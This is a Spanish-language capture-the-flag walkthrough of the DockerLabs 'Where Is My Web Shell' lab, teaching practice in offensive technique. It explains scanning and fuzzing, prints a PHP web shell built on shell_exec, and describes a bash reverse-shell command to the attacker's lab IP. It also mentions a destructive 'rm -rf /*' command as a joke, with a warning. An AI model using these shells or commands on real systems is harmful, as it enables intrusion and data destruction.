---
title: Where Is My Web Shell
node_type: machine
platform: dockerlabs
difficulty: facil
os: linux
source_path: Maquinas De Dockerlabs/Maquinas Faciles/Where Is My Web Shell.md
needs_review: false
---

<!-- AUTO-GENERATED: BanditBox knowledge base. Safe to overwrite. -->

# Where Is My Web Shell

## Resumen

Where Is My Web Shell esta pensada para practicar web shells: el objetivo es localizar la funcionalidad de subida, conseguir ejecucion en el servidor y documentar la interaccion posterior con la shell.

Fuente original: [Maquinas De Dockerlabs/Maquinas Faciles/Where Is My Web Shell.md](https://github.com/8andit0/BanditBox/blob/main/Maquinas%20De%20Dockerlabs/Maquinas%20Faciles/Where%20Is%20My%20Web%20Shell.md)

## Datos clave

| Campo | Valor |
|---|---|
| Plataforma | DockerLabs |
| Dificultad | facil |
| Sistema operativo | linux |
| Puertos detectados por texto | 1234 |
| Imagenes en fuente | 21 |
| Palabras en fuente | 1567 |
| Requiere revision | false |

## Resolucion paso a paso

>Hoy haremos una máquina facilita para reforzar conceptos de web Shell

![Where Is My Web Shell](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Where%20Is%20My%20Web%20Shell.png)**

>Así que sin mucho más, levantamos la máquina, descomprimiendo el “.zip” y ejecutando el script de automatización:

![Where Is My Web Shell](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Where%20Is%20My%20Web%20Shell%201.png)

>Una vez en funcionamiento, verificamos la conexión con la misma, con un ping a la ip:

![Where Is My Web Shell](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Where%20Is%20My%20Web%20Shell%202.png)
_(Con esto en pocas palabras; enviamos tramas ICMP “Internet Control Message Protocol” tipo (Echo Request) a la ip victima, esta misma, al estar en funcionamiento, verifica las cabeceras del paquete para determinar que es para ella, y responde con un (Echo Reply).)_

1. _Podemos ver el orden de estas tramas ICMP en el apartado “icmp_seq=”,_
2. _Con el valor de “ttl=” podemos ver el número máximo de saltos que puede dar un paquete antes de descartarse(Por lo general funciona para determinar el sistema operativo víctima)._
3. _Con el valor “time=” podemos ver el tiempo entre el “Echo Request” y el “Echo Reply”)_

>Ya que verificamos la conexión, vamos a por el primer escaneo con nmap, para identificar los puertos abiertos de la máquina, y lo que corre en cada uno de ellos:

![Where Is My Web Shell](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Where%20Is%20My%20Web%20Shell%203.png)
1. _-- min-rate 5000 (quiero tramitar mínimo 5000 paquetes por segundo) esto para que el escaneo vaya con bastante agilidad._
2. _-n (no deseo que nmap haga una resolución DNS automática)
3. _-p- (quiero escanear los 65535 puertos del sistema, no los 1000 más comunes, como normalmente hace nmap)._
4. _-Pn (Omite el descubrimiento de Host)_
5. _-sVC (Este concatena el parámetro -sV que realiza un reconocimiento de versiones de servicios, y el parámetro -sC que aplica unos cuantos scripts de reconocimiento propios de nmap_

>Vemos solamente un puerto abierto, con una versión medio actual de Apache.
>Terminamos con el reconocimiento haciendo una pequeña enumeración a las tecnologías que corren en el servidor web con “whatweb”. Aunque no vemos mucho, podemos ver en el título que se trata de una academia de Inglés:

**![Where Is My Web Shell](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Where%20Is%20My%20Web%20Shell%204.png)**

>Al inspeccionar la web no encontramos mucho:

![Where Is My Web Shell](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Where%20Is%20My%20Web%20Shell%205.png)

>Revisando en código fuente de la pagina vemos un mensaje:

![Where Is My Web Shell](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Where%20Is%20My%20Web%20Shell%206.png)
>Probablemente eso nos ayudara mas tarde, por ahora al no ver nada mas, pasamos a hacer un poco de enumeración de directorios y archivos en la web
>Hay muchas herramientas para enumerar directorios; [Dirb](https://www.kali.org/tools/dirb/), [Gobuster](https://github.com/OJ/gobuster), [Wfuzz](https://www.kali.org/tools/wfuzz/), Pero la que yo considero más eficiente es [ffuf](https://github.com/ffuf/ffuf), así que para usarla:

![Where Is My Web Shell](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Where%20Is%20My%20Web%20Shell%207.png)
1. _-c Para que se vea bonito con colorcitos_ ╰(*°▽°*)╯
2. _-w Para especificar el diccionario que se probará en la url (uso un diccionario de [Seclists](https://github.com/danielmiessler/SecLists) _)_
3. _-t para indicarle la cantidad de hilos (tareas múltiples) que deseo para la tarea a realizar, en este caso 200_
4. _-u indicamos la url a atacar, con la palabra interna FUZZ le indicamos a la herramienta la parte de la url que debe ser cambiada por las palabras del el diccionario._
5. _-e indicamos diferentes terminaciones que deseamos agregar a cada iteración en el diccionario, mientras que las comillas vacías hacen referencia a probar la palabra sin ninguna terminación (ej: -e .txt,.php,”” Probará en la web: palabra.txt, palabra .php y palabra)_

>Encontramos dos archivos interesantes:

![Where Is My Web Shell](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Where%20Is%20My%20Web%20Shell%208.png)

>El segundo archivo nos dice esto:

![Where Is My Web Shell](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Where%20Is%20My%20Web%20Shell%209.png)

>Si la web tiene una webshell, esta misma necesitaría de un parámetro especifico para funcionar correctamente. Tal vez por ello "ffuf" encontró el archivo “shell.php” pero nos da un código de estado 500 "Internal Server Error". Es decir, el archivo existe, pero no podemos acceder correctamente a él.

>La web shell funciona de esta manera:

```php
<?php
echo "<pre>" . shell_exec($_REQUEST["parametro__cualquiera"]) . "</pre>";
?>
```
_En php $_REQUEST recoge información de un "parámetro_cualquiera", y la función "shell_exec" ejecuta lo proporcionado directamente en el sistema. Es decir, en teoría, si encontramos el parámetro y le pasamos un valor “whoami”, $_REQUEST recogerá ese dato, y "shell_exec" lo ejecutara en el sistema, para que finalmente (como todo está dentro de un “echo”) mostrarse en pantalla la respuesta www-data

>Así que, para llegar a nuestro posible parámetro, vamos a cambiar el funcionamiento del fuzzing que hicimos antes:

![Where Is My Web Shell](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Where%20Is%20My%20Web%20Shell%2010.png)
_La estructura usual en la que un archivo ".php" recibe un parámetro desde la URL es:
```
http://URL/archivo.php?parámetro=valor_del_parametro”
```
Así que la parte que debemos fuzzear cambia. También, agregamos la flag "-fc 500" para ocultar los resultados que nos devuelvan un código de estado “internal server error” (500).

>Encontramos uno:

![Where Is My Web Shell](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Where%20Is%20My%20Web%20Shell%2011.png)

>El parámetro es “parameter” :3, probémoslo en la web:

![Where Is My Web Shell](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Where%20Is%20My%20Web%20Shell%2012.png)

>Tenemos un RCE (remote code execution), podemos ejecutar comandos en la web. Sin perder tiempo, vamos a obtener una reverse Shell.
>Para obtener un payload de webshell te recomiendo la pagina [https://www.revshells.com/](https://www.revshells.com/). Usaremos el siguiente payload:

![Where Is My Web Shell](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Where%20Is%20My%20Web%20Shell%2013.png)

>Primero, debemos disponer nuestra máquina para recibir una Shell desde otro equipo, para esto, nos ponemos en escucha por el puerto 1234 con “nc”:

![Where Is My Web Shell](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Where%20Is%20My%20Web%20Shell%2014.png)
1. nc Es un binario multipropósito, sirve para ejecutar shells, transferir archivos, enviar y recibir datos, etc, etc…
2. -n Igual que con nmap, este parámetro nos quita la resolución automática de nombres de host (para acelerar el proceso)
3. -l Con este parámetro entramos en un modo de escucha de conexiones
4. -v El modo verbose lo usamos para ver más detalles sobre la escucha e información de la conexión
5. -p con este parámetro indicamos el puerto que estará en escucha, en este caso el 1234

>Ya que nuestra máquina está escuchando, podemos inyectar el payload, aunque un poco diferente para que funcione correctamente desde la URL:

![Where Is My Web Shell](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Where%20Is%20My%20Web%20Shell%2015.png)
_//El %26 es una codificación en URL de “&” para que no hayan problemas//_
_Vamos a intentar entenderlo al máximo este comando:_
1. _bash -c Ejecuta lo siguiente dentro de las comillas como una subshell, en pocas palabras, ejecuta el comando entre comillas como si fuera un script de bash._
2. _bash -i Lanza una bash en modo interactivo (para tener una shell medianamente funcional)_
3. _>%26 /dev/tcp/172.17.0.1/1234 0>%261 Es una manera PROPIA de bash para abrir una conexión TCP hacia una ip y un puerto, con la primera parte >%26 /dev/tcp/ip/puerto dirigimos el stdout (respuestas de la shell) de la maquina victima a nuestra ip, y con la segunda parte 0>%261 indicamos que el stdin(comandos que insertamos) de nuestra máquina irá a la ip victima para ser interpretado. En pocas palabras, abrimos una comunicación bidireccional entre nuestra ip y la ip victima, redireccionando nuestra entrada estándar (stdin) y la salida estándar de la víctima (stdout)._

>Con todo ello, ya entramos al sistema :3:

![Where Is My Web Shell](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Where%20Is%20My%20Web%20Shell%2016.png)

>Tratamos un poco la Shell para que sea un poco más funcional:

![Where Is My Web Shell](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Where%20Is%20My%20Web%20Shell%2017.png)
_Aquí, le estamos diciendo a la Shell que deseamos que la variable de entorno TERM(responsable de especificar el tipo de terminal usado), sea igual a Xterm._
_Sí TERM no se establece o está mal establecido en la máquina, cosas como clear, nano, vim, less, no funcionan correctamente._

>Revisamos según la pista que nos dejaron en el código fuente de la web el directorio /tmp:

![Where Is My Web Shell](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Where%20Is%20My%20Web%20Shell%2018.png)

>Nos encontramos un archivo oculto (para listar archivos que están ocultos de manera eficiente en un directorio en especial, puedes usar el comando ls con las flags -l -a -h)

![Where Is My Web Shell](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Where%20Is%20My%20Web%20Shell%2019.png)

>Ya con la contraseña de root en texto claro, tenemos la máquina :3

![Where Is My Web Shell](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Where%20Is%20My%20Web%20Shell%2020.png)

O.O   //El comando "rm -rf /*" ejecutado como administrador borra todos los archivos del sistema, es un pequeño guiño al ganar acceso como root a una máquina, NO LO EJECUTES//   O.O


## Cadena de ataque detectada

- **Enumeration**: Apache, Connectivity check, HTTP, PHP, Port enumeration, Web enumeration
- **Initial Access**: Malicious file upload, Remote Code Execution
- **Post Exploitation**: Credential extraction


## Tecnicas utilizadas

- [Connectivity check](../../../techniques/connectivity-check.md)
- [Credential extraction](../../../techniques/credential-extraction.md)
- [Malicious file upload](../../../techniques/malicious-file-upload.md)
- [Port enumeration](../../../techniques/port-enumeration.md)
- [Remote Code Execution](../../../techniques/rce.md)
- [Web enumeration](../../../techniques/web-enumeration.md)


## Herramientas utilizadas

- [FFUF / WFuzz](../../../tools/ffuf-wfuzz.md)
- [Gobuster](../../../tools/gobuster.md)
- [Netcat](../../../tools/netcat.md)
- [Nmap](../../../tools/nmap.md)
- [Ping](../../../tools/ping.md)
- [WhatWeb](../../../tools/whatweb.md)


## Servicios relacionados

- [Apache](../../../services/apache.md)
- [HTTP](../../../services/http.md)
- [PHP](../../../services/php.md)


## Vulnerabilidades relacionadas

- [Insecure file upload](../../../vulnerabilities/insecure-file-upload.md)
- [Weak credentials](../../../vulnerabilities/weak-credentials.md)


## Metodos de escalada

- Sin relaciones confirmadas en el contenido actual.
